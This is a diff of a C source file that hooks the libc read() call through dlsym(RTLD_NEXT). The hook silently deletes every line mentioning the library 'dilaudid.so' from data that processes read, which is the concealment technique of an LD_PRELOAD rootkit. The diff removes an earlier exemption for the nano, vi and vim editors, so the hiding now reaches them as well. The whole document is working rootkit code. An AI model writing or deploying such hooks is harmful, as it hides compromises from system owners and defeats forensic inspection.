@@ -1,43 +1,49 @@
-#define _GNU_SOURCE  
-#include <unistd.h> 
+#define _GNU_SOURCE
+#include <dlfcn.h>
 #include <string.h>
-#include <dlfcn.h> 
+#include <unistd.h>
 
 ssize_t read(int fd, void *buf, size_t count) {
-    static ssize_t (*orig)(int, void*, size_t) = NULL;
-    if (!orig) orig = dlsym(RTLD_NEXT, "read");
-
-    // ALLOWLIST: If the program is nano, vi, or vim, bypass the text filtering
-    if (program_invocation_short_name && (
-        strcmp(program_invocation_short_name, "nano") == 0 ||
-        strcmp(program_invocation_short_name, "vi") == 0 ||
-        strcmp(program_invocation_short_name, "vim") == 0)) {
-        
-        return orig(fd, buf, count); // Show the raw text strings normally
+    static ssize_t (*real_read)(int, void *, size_t) = NULL;
+    if (!real_read) {
+        real_read = dlsym(RTLD_NEXT, "read");
     }
 
-    ssize_t result = orig(fd, buf, count);
+    ssize_t result = real_read(fd, buf, count);
 
     if (result > 0) {
+        char *start = (char *)buf;
         char *match;
-        // Automatically calculates length at compile time
-        size_t lib_len = sizeof(LIB_TO_HIDE) - 1; 
-        
-        // Loop as long as the library name exists in the remaining buffer data
-        while ((match = memmem(buf, result, LIB_TO_HIDE, lib_len)) != NULL) {
-            char *start = (char *)buf;
-            char *end = start + result;
 
-            // Find start and end boundaries of the matching line
-            char *line_start = memrchr(buf, '\n', match - start);
-            line_start = line_start ? line_start + 1 : start;
+        // Perform the search relative to the current position inside the buffer
+        while ((match = memmem(start, result, "dilaudid.so", 11)) != NULL) {
+            char *buf_start = (char *)buf;
+            char *end = buf_start + result;
+
+            // Safe calculation for memrchr: search backward from match to the start of the buffer
+            char *line_start = NULL;
+            if (match > buf_start) {
+                line_start = memrchr(buf_start, '\n', match - buf_start);
+            }
+            // Ensure line_start is either the character after the newline or the absolute beginning
+            line_start = line_start ? line_start + 1 : buf_start;
 
             char *line_end = memchr(match, '\n', end - match);
             line_end = line_end ? line_end + 1 : end;
 
-            // Completely erase the line by shifting memory
-            memmove(line_start, line_end, end - line_end);
-            result -= (line_end - line_start);
+            size_t line_len = line_end - line_start;
+
+            if (line_len > 0) {
+                // Shift remaining data forward to overwrite the line
+                memmove(line_start, line_end, end - line_end);
+                result -= line_len;
+
+                // Reset the search anchor to the beginning of the modified buffer
+                start = buf_start;
+            } else {
+                // Safeguard against 0-byte modifications to prevent infinite loops
+                break;
+            }
         }
     }
     return result;
